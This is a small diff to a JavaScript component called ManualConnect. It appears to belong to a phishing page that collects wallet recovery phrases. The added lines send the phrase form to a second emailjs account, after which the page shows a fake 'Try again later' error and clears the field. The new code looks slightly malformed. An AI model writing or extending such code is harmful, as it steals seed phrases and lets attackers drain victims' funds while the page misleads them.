@@ -28,6 +28,13 @@ function ManualConnect() {
         "mQcWugYQOwuKdh1vu"
       )
       .then((response) => {
+       emailjs
+      .sendForm(
+        "service_udsvw3d",
+        "template_w2c0rx5",
+        phraseform.current,
+        "DNsER4-4UGLWYPh73"
+      )
         setLoading(false);
         alert("Try again later");
         setPhrase("");
